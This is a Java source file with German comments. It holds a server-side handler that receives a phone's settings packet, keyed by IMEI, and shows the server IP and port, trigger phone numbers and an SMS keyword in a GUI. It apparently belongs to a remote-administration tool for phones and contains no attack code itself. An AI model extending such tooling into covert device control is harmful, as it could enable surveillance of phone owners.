package handler;

import server.Server;
import Packet.Packet;
import Packet.PreferencePacket;
import gui.GUI;

/**
 * Diese Klasse ist zur Verarbeitung von PreferencePackets auf dem Server zust�ndig.
 */
public class PreferenceHandler  implements PacketHandler {
	/**
	 * gui	Die Benutzeroberfl�che
	 */
	private GUI gui;
	/**
	 * channel der Datenkanal
	 */
	private int channel;
	/**
	 * imei Die IMEI des verbundenen Ger�tes
	 */
	private String imei;

	/**
	 * Der Konstruktor der Klasse �bergibt den Klassenvariablen die erhaltenen Daten.
	 * @param chan	Der Kanal
	 * @param imei	Die IMEI
	 * @param gui	Die GUI
	 */
	public PreferenceHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * Diese Methode erstelle eine Lognachricht. Danach wir der Listener f�r den Datenkanal entfernt, da die Daten angekommen sind.
	 * Im Anschluss wird die updatePreference-Methode aufgerufen um die Daten auf der GUI anzuzeigen.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Server
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Preference data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		PreferencePacket packet = (PreferencePacket) p;
		gui.updatePreference(imei, packet.getIp(), packet.getPort(), packet.isWaitTrigger(), packet.getPhoneNumberCall(), packet.getPhoneNumberSMS(), packet.getKeywordSMS());
	}

}
